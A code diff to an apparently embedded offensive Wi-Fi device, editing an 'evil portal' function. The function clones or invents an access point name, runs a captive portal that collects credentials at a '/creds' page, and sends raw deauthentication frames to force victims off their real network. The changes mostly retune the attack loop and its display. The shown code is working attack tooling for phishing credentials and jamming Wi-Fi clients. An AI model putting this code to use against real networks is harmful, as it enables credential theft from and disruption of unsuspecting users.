@@ -57,7 +57,6 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
           AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:");
           }
         else { // tssid != "" means that is was cloned and can deploy Deauth
-          send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
           AP_name = tssid;
         }
 
@@ -137,7 +136,7 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
             tft.drawCentreString("Evil Portal",tft.width()/2, 29, SMOOTH_FONT);
             tft.setCursor(8,46);
             tft.setTextColor(FGCOLOR);
-            tft.println("AP: " + AP_name);
+            tft.println("AP: " + AP_name.substring(0,15));
             tft.setCursor(8,tft.getCursorY());
             tft.println("->" + WiFi.softAPIP().toString() + "/creds");
             tft.setCursor(8,tft.getCursorY());
@@ -156,18 +155,21 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
               if (hold_deauth) {
                 tft.setTextSize(FP);
                 tft.setTextColor(FGCOLOR);
-                tft.drawRightString("Deauth OFF", tft.width()-6,tft.height()-8,SMOOTH_FONT);
+                tft.drawRightString("Deauth OFF", tft.width()-8,tft.height()-16,SMOOTH_FONT);
               } else {
                 tft.setTextSize(FP);
                 tft.setTextColor(TFT_RED);
-                tft.drawRightString("Deauth ON", tft.width()-6,tft.height()-8,SMOOTH_FONT);
+                tft.drawRightString("Deauth ON", tft.width()-8,tft.height()-16,SMOOTH_FONT);
               }
             }
 
             redraw=false;
           }
 
-          if(!hold_deauth && (millis()-tmp) >5  && deauth)  {
+          dnsServer.processNextRequest();
+          ep->handleClient();
+
+          if(!hold_deauth && (millis()-tmp) >250  && deauth)  {
             send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
             tmp=millis();
           }
@@ -181,8 +183,6 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
             redraw=true;
             previousTotalCapturedCredentials = totalCapturedCredentials-1;
           }
-          dnsServer.processNextRequest();
-          ep->handleClient();
 
           if(checkEscPress()) break;
         }
